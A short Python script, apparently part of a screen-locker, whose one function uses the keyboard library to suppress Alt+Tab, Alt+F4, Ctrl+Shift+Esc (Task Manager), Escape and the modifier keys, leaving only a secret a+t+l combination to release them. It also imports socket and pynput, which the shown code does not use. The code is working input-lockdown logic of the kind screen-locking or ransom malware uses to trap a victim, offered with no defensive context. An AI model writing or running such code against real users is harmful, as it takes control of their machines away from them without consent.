import keyboard
import pynput
import socket
def dis_keys():
	keyboard.add_hotkey("alt + tab", lambda: None, suppress =True)
	keyboard.add_hotkey("alt + f4", lambda: None, suppress =True)
	keyboard.add_hotkey("cmd + d", lambda: None, suppress =True)
	keyboard.add_hotkey("ctrl + esc", lambda: None, suppress =True)
	keyboard.add_hotkey("ctrl + o", lambda: None, suppress =True)
	keyboard.add_hotkey("a+t+l", lambda: keyboard.unhook_all())
	keyboard.add_hotkey("cmd + o", lambda: None, suppress =True)
	keyboard.add_hotkey("shift", lambda: None, suppress =True)
	keyboard.add_hotkey("tab", lambda: None, suppress =True)
	keyboard.add_hotkey("cmd", lambda: None, suppress =True)
	keyboard.add_hotkey("ctrl", lambda: None, suppress =True)
	keyboard.add_hotkey("esc", lambda: None, suppress =True)
	keyboard.add_hotkey("alt", lambda: None, suppress =True)
	keyboard.add_hotkey("ctrl+shift+esc", lambda: None, suppress =True)